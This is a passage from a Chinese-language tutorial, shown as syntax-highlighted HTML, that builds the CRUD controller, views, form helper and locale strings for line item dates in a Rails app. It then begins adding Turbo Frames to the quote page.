    <span class="token property">gap</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--space-xs<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>不要忘了引入新的css文件到manifest中</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css">// app/assets/stylesheets/application.sass.scss

// All the previous code
<span class="token atrule"><span class="token rule">@import</span> <span class="token string">"components/line_item_date"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>一切正常工作，可以在浏览器中测试一下，现在我们开始写Controller</p>
<h2 id="Our-standard-CRUD-controller"><a href="#Our-standard-CRUD-controller" class="headerlink" title="Our standard CRUD controller"></a>Our standard CRUD controller</h2><h3 id="Creating-line-item-dates-without-Turbo"><a href="#Creating-line-item-dates-without-Turbo" class="headerlink" title="Creating line item dates without Turbo"></a>Creating line item dates without Turbo</h3><p>现在我们的数据库，模型，路由，样式都完成了，是时候开始写Controller了，如上面的介绍，我们先构建一个不使用<strong>Turbo Frames and Turb Streams</strong>的标准增删改查，我们将在后面再优化。</p>
<p>我们先写<code>#new and #create</code>actions</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/line_item_dates_controller.rb</span>

<span class="token keyword">class</span> <span class="token class-name">LineItemDatesController</span> <span class="token operator">&lt;</span> ApplicationController
  before_action <span class="token symbol">:set_quote</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">new</span></span>
    <span class="token variable">@line_item_date</span> <span class="token operator">=</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>line_item_dates<span class="token punctuation">.</span>build
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">create</span></span>
    <span class="token variable">@line_item_date</span> <span class="token operator">=</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>line_item_dates<span class="token punctuation">.</span>build<span class="token punctuation">(</span>line_item_date_params<span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token variable">@line_item_date</span><span class="token punctuation">.</span>save
      redirect_to quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Date was successfully created."</span></span>
    <span class="token keyword">else</span>
      render <span class="token symbol">:new</span><span class="token punctuation">,</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token symbol">:unprocessable_entity</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  <span class="token keyword">private</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">line_item_date_params</span></span>
    params<span class="token punctuation">.</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token symbol">:line_item_date</span><span class="token punctuation">)</span><span class="token punctuation">.</span>permit<span class="token punctuation">(</span><span class="token symbol">:date</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">set_quote</span></span>
    <span class="token variable">@quote</span> <span class="token operator">=</span> current_company<span class="token punctuation">.</span>quotes<span class="token punctuation">.</span>find<span class="token punctuation">(</span>params<span class="token punctuation">[</span><span class="token symbol">:quote_id</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再加上对应的视图模版</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_item_dates/new.html.erb %></span>

<span class="token operator">&lt;</span>main <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"container"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to sanitize<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"&amp;larr; Back to quote"</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span> quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span> <span class="token string-literal"><span class="token string">%>

  &lt;div class="header"></span></span>
    <span class="token operator">&lt;</span>h1<span class="token operator">></span>New date<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token string-literal"><span class="token string">"form"</span></span><span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span><span class="token punctuation">,</span> <span class="token symbol">line_item_date</span><span class="token operator">:</span> <span class="token variable">@line_item_date</span> <span class="token string-literal"><span class="token string">%>
&lt;/main></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>LineItemDates#new</code>页面不需要特别的设计，因为稍后我们将使用Turbo从页面中提取表单并将其插入<code>Quotes#show</code>页面。但是，对于使用不支持Turbo的旧浏览器的用户来说，它仍然是可用的。让我们为我们的表单添加标记:</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_item_dates/_form.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> simple_form_for <span class="token punctuation">[</span>quote<span class="token punctuation">,</span> line_item_date<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token symbol">html</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"form line-item-date"</span></span> <span class="token punctuation">&#125;</span> <span class="token keyword">do</span> <span class="token operator">|</span>f<span class="token operator">|</span> <span class="token string-literal"><span class="token string">%>
  &lt;% if line_item_date.errors.any? %></span></span>
    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"error-message"</span></span><span class="token operator">></span>
      <span class="token operator">&lt;</span><span class="token operator">%=</span> line_item_date<span class="token punctuation">.</span>errors<span class="token punctuation">.</span>full_messages<span class="token punctuation">.</span>to_sentence<span class="token punctuation">.</span>capitalize <span class="token string-literal"><span class="token string">%>
    &lt;/div></span></span>
  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token string-literal"><span class="token string">%>

  &lt;%= f.input :date, html5: true, input_html: &#123; autofocus: true &#125; %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to <span class="token string-literal"><span class="token string">"Cancel"</span></span><span class="token punctuation">,</span> quote_path<span class="token punctuation">(</span>quote<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--light"</span></span> <span class="token string-literal"><span class="token string">%>
  &lt;%= f.submit class: "btn btn--secondary" %></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在我们再在浏览器中测试一下吧</p>
<h2 id="Refactoring-the-error-notification-message"><a href="#Refactoring-the-error-notification-message" class="headerlink" title="Refactoring the error notification message"></a>Refactoring the error notification message</h2><p>这是一个好机会去重构表单中提示的异常信息，我们可能已经注意到了不论在quote表单还是line item date表单中使用了相同方式去展示异常数据。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/_form.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> quote<span class="token punctuation">.</span>errors<span class="token punctuation">.</span>any<span class="token operator">?</span> <span class="token string-literal"><span class="token string">%>
  &lt;div class="error-message"></span></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> quote<span class="token punctuation">.</span>errors<span class="token punctuation">.</span>full_messages<span class="token punctuation">.</span>to_sentence<span class="token punctuation">.</span>capitalize <span class="token string-literal"><span class="token string">%>
  &lt;/div></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_item_dates/_form.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> line_item_date<span class="token punctuation">.</span>errors<span class="token punctuation">.</span>any<span class="token operator">?</span> <span class="token string-literal"><span class="token string">%>
  &lt;div class="error-message"></span></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> line_item_date<span class="token punctuation">.</span>errors<span class="token punctuation">.</span>full_messages<span class="token punctuation">.</span>to_sentence<span class="token punctuation">.</span>capitalize <span class="token string-literal"><span class="token string">%>
  &lt;/div></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们想让整个项目一致的展示异常信息，让我们创建helper方法来保证每个表单都使用同样的方式处理</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/helpers/application_helper.rb</span>

<span class="token keyword">module</span> <span class="token class-name">ApplicationHelper</span>
  <span class="token comment"># All the previous code</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">form_error_notification</span></span><span class="token punctuation">(</span>object<span class="token punctuation">)</span>
    <span class="token keyword">if</span> object<span class="token punctuation">.</span>errors<span class="token punctuation">.</span>any<span class="token operator">?</span>
      tag<span class="token punctuation">.</span>div <span class="token keyword">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"error-message"</span></span> <span class="token keyword">do</span>
        object<span class="token punctuation">.</span>errors<span class="token punctuation">.</span>full_messages<span class="token punctuation">.</span>to_sentence<span class="token punctuation">.</span>capitalize
      <span class="token keyword">end</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在，我们的项目有了两个helper方法，现在可以这么做，但当我们的项目越变越大，把这些helper交给逻辑独立的单元管理就很重要了，比如使用<code>FormHelper</code>处理表单相关的代码。不过现在我们不需要着重考虑，我们仅仅消除重复：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token string-literal"><span class="token string">%# app/views/line_item_dates/_form.html.erb %>

&lt;%#</span></span> All the previous code <span class="token string-literal"><span class="token string">%>
&lt;%= form_error_notification(line_item_date) %></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># All the previous code %></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token string-literal"><span class="token string">%# app/views/quotes/_form.html.erb %>

&lt;%#</span></span> All the previous code <span class="token string-literal"><span class="token string">%>
&lt;%= form_error_notification(quote) %></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># All the previous code %></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过这个helper，最终line item date表单就是下面的样子：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_item_dates/_form.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> simple_form_for <span class="token punctuation">[</span>quote<span class="token punctuation">,</span> line_item_date<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token symbol">html</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"form line-item-date"</span></span> <span class="token punctuation">&#125;</span> <span class="token keyword">do</span> <span class="token operator">|</span>f<span class="token operator">|</span> <span class="token string-literal"><span class="token string">%>
  &lt;%= form_error_notification(line_item_date) %></span></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> f<span class="token punctuation">.</span>input <span class="token symbol">:date</span><span class="token punctuation">,</span> <span class="token symbol">html5</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token symbol">input_html</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">autofocus</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span> <span class="token string-literal"><span class="token string">%>
  &lt;%= link_to "Cancel", quote_path(quote), class: "btn btn--light" %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> f<span class="token punctuation">.</span>submit <span class="token keyword">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--secondary"</span></span> <span class="token string-literal"><span class="token string">%>
&lt;% end %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>记得在浏览器中再测试一下呐</p>
<p>让我们花几秒钟的时间用标签和提交按钮所需的文本填充翻译文件:</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># config/locales/simple_form.en.yml</span>

<span class="token key atrule">en</span><span class="token punctuation">:</span>
  <span class="token key atrule">simple_form</span><span class="token punctuation">:</span>
    <span class="token key atrule">placeholders</span><span class="token punctuation">:</span>
      <span class="token key atrule">quote</span><span class="token punctuation">:</span>
        <span class="token key atrule">name</span><span class="token punctuation">:</span> Name of your quote
    <span class="token key atrule">labels</span><span class="token punctuation">:</span>
      <span class="token key atrule">quote</span><span class="token punctuation">:</span>
        <span class="token key atrule">name</span><span class="token punctuation">:</span> Name
      <span class="token key atrule">line_item_date</span><span class="token punctuation">:</span>
        <span class="token key atrule">date</span><span class="token punctuation">:</span> Date

  <span class="token key atrule">helpers</span><span class="token punctuation">:</span>
    <span class="token key atrule">submit</span><span class="token punctuation">:</span>
      <span class="token key atrule">quote</span><span class="token punctuation">:</span>
        <span class="token key atrule">create</span><span class="token punctuation">:</span> Create quote
        <span class="token key atrule">update</span><span class="token punctuation">:</span> Update quote
      <span class="token key atrule">line_item_date</span><span class="token punctuation">:</span>
        <span class="token key atrule">create</span><span class="token punctuation">:</span> Create date
        <span class="token key atrule">update</span><span class="token punctuation">:</span> Update date<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这样当创建<code>LineItemDate</code>时就展示：<code>Create date</code>,在修改时展示：<code>Update date</code></p>
<h2 id="Updating-line-item-dates-without-Turbo"><a href="#Updating-line-item-dates-without-Turbo" class="headerlink" title="Updating line item dates without Turbo"></a>Updating line item dates without Turbo</h2><p>现在<code>#new and #create</code>action正常工作了，让我们接着写<code>#edit and #update</code>action，我们从Controller开始</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">LineItemDatesController</span> <span class="token operator">&lt;</span> ApplicationController
  before_action <span class="token symbol">:set_quote</span>
  before_action <span class="token symbol">:set_line_item_date</span><span class="token punctuation">,</span> <span class="token symbol">only</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token symbol">:edit</span><span class="token punctuation">,</span> <span class="token symbol">:update</span><span class="token punctuation">,</span> <span class="token symbol">:destroy</span><span class="token punctuation">]</span>

  <span class="token comment"># All the previous code</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">edit</span></span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">update</span></span>
    <span class="token keyword">if</span> <span class="token variable">@line_item_date</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span>line_item_date_params<span class="token punctuation">)</span>
      redirect_to quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Date was successfully updated."</span></span>
    <span class="token keyword">else</span>
      render <span class="token symbol">:edit</span><span class="token punctuation">,</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token symbol">:unprocessable_entity</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  <span class="token keyword">private</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">set_line_item_date</span></span>
    <span class="token variable">@line_item_date</span> <span class="token operator">=</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>line_item_dates<span class="token punctuation">.</span>find<span class="token punctuation">(</span>params<span class="token punctuation">[</span><span class="token symbol">:id</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  <span class="token comment"># All the previous code</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们知道 <code>#destory</code>action 也需要<code>set_line_item_date</code>回调，所以提前加上去了，针对需要这个回调的操作。</p>
<p>现在action已经实现了，让我们添加<code>LineItemDates#edit</code>页面，并在浏览器中测试</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_item_dates/edit.html.erb %></span>

<span class="token operator">&lt;</span>main <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"container"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to sanitize<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"&amp;larr; Back to quote"</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span> quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span> <span class="token string-literal"><span class="token string">%>

  &lt;div class="header"></span></span>
    <span class="token operator">&lt;</span>h1<span class="token operator">></span>Edit date<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token string-literal"><span class="token string">"form"</span></span><span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token variable">@quote</span><span class="token punctuation">,</span> <span class="token symbol">line_item_date</span><span class="token operator">:</span> <span class="token variable">@line_item_date</span> <span class="token string-literal"><span class="token string">%>
&lt;/main></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到：<code>LineItemDates#edit</code>view 和 <code>LineItemDates#new</code>view 十分相似，只有标题不一样，现在我们在浏览器中测试一下，只剩下一个操作要完成了！</p>
<h2 id="Deleting-line-item-dates-without-Turbo"><a href="#Deleting-line-item-dates-without-Turbo" class="headerlink" title="Deleting line item dates without Turbo"></a>Deleting line item dates without Turbo</h2><p>这个操作是最简单的，也没有视图，我们只需要在删除后，重定向到<code>Quotes#show</code>页面</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">LineItemDatesController</span> <span class="token operator">&lt;</span> ApplicationController
  <span class="token comment"># All the previous code</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">destroy</span></span>
    <span class="token variable">@line_item_date</span><span class="token punctuation">.</span>destroy

    redirect_to quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Date was successfully destroyed."</span></span>
  <span class="token keyword">end</span>

  <span class="token comment"># All the previous code</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一切运转正常，为了防止用户以外删除数据，我们加入提示语</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_item_dates/_line_item_date.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> button_to <span class="token string-literal"><span class="token string">"Delete"</span></span><span class="token punctuation">,</span>
              quote_line_item_date_path<span class="token punctuation">(</span>quote<span class="token punctuation">,</span> line_item_date<span class="token punctuation">)</span><span class="token punctuation">,</span>
              <span class="token symbol">method</span><span class="token operator">:</span> <span class="token symbol">:delete</span><span class="token punctuation">,</span>
              <span class="token symbol">form</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">turbo_confirm</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Are you sure?"</span></span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
              <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--light"</span></span> <span class="token string-literal"><span class="token string">%>

&lt;!-- All the previous code --></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>button_to helper</code> 生成了HTML中的表单部分，如果我们从DOM中查看，就是下面的样子：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">data-turbo-confirm</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Are you sure?<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button_to<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/quotes/123/line_item_dates/456<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_method<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>delete<span class="token punctuation">"</span></span> <span class="token attr-name">autocomplete</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>off<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn--light<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Delete<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>authenticity_token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>long_token<span class="token punctuation">"</span></span> <span class="token attr-name">autocomplete</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>off<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>需要注意的是<code>data-turbo-confirm</code>数据是在<code>&lt;form&gt; 标签中</code>，但我们删除时，确认信息显示在屏幕上。</p>
<p>现在增删改查就完成了，但我们想要所有的交互都在同一页面中，通过Turbo，我们仅需要几行代码就可以完成优化。</p>
<h2 id="Adding-Turbo-Frames-and-Turbo-Streams"><a href="#Adding-Turbo-Frames-and-Turbo-Streams" class="headerlink" title="Adding Turbo Frames and Turbo Streams"></a>Adding Turbo Frames and Turbo Streams</h2><p>现在我们让所有的交互操作放到<code>Quotes#show</code>页面，这和我们之前在<code>Quotes#index</code>页面的操作类似</p>
<h3 id="Creating-line-item-dates-with-Turbo"><a href="#Creating-line-item-dates-with-Turbo" class="headerlink" title="Creating line item dates with Turbo"></a>Creating line item dates with Turbo</h3><p>为了理清需求，让我们画一个草图说明，当用户访问<code>Quotes#show</code>页面，并且点击<code>New date</code>按钮，表单直接渲染到<code>Quotes#show</code>页面，这里就需要Turbo Frames了，当然我们也就需要<code>data-turbo-frame</code>去将<code>New date</code>链接嵌套到一个空的Turbo Frame</p>
<p><img src="../../../../public/img/image-20230626123613801.png" alt="image-20230626123613801"></p>
<p>为了能进行替换，需要使用相同的id，根据约定，这个id是new_line_item_date，因为它是LineItemDate模型的一个新实例。</p>
<p><img src="../../../../public/img/image-20230626123817025.png" alt="image-20230626123817025"></p>
<p>当用户点击<code>New date</code>按钮时，Turbo就能成功替换<code>Quotes#show</code>页面中的空Turbo Frame，使用<code>LineItemDates#new</code>页面中Turbo Frame包含的表单。</p>
<p><img src="../../../../public/img/image-20230626124025866.png" alt="image-20230626124025866"></p>
<p>当用户提交表单后，如果该条quote已经有数据了，我们想要新建的line item被插入到<code>Quotes#show</code>页面中正确的位置上，并按照升序展示。</p>
<p><img src="../../../../public/img/image-20230626124303741.png" alt="image-20230626124303741"></p>
<p>另一方面，如果该条quote之前没有一条数据，那刚刚新建的数据对应的HTML应该被插入到列表的开始位置。</p>
<p><img src="../../../../public/img/image-20230626124519572.png" alt="image-20230626124519572"></p>
<p>现在需求已经理清楚了，通过Turbo Frames and Turbo Streams，我们能仅用几行代码就能实现目标。</p>
<p>先来完成第一部分：用户点击<code>New date</code>按钮时，表单出现在<code>Quotes#show</code>页面，这和<code>Quotes#index</code>页面是类似的。在<code>Quotes#show</code>页面中，让我们添加一个id为<code>new_line_itme_date</code>的空Turbo Frame，并且链接到<code>New date</code>按钮上</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/quotes/show.html.erb %></span>

<span class="token operator">&lt;</span>main <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"container"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to sanitize<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"&amp;larr; Back to quotes"</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span> quotes_path <span class="token string-literal"><span class="token string">%>

  &lt;div class="header"></span></span>
    <span class="token operator">&lt;</span>h1<span class="token operator">></span>
      <span class="token operator">&lt;</span><span class="token operator">%=</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>name <span class="token string-literal"><span class="token string">%>
    &lt;/h1></span></span>

    <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to <span class="token string-literal"><span class="token string">"New date"</span></span><span class="token punctuation">,</span>
                new_quote_line_item_date_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token symbol">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">turbo_frame</span><span class="token operator">:</span> dom_id<span class="token punctuation">(</span><span class="token class-name">LineItemDate</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
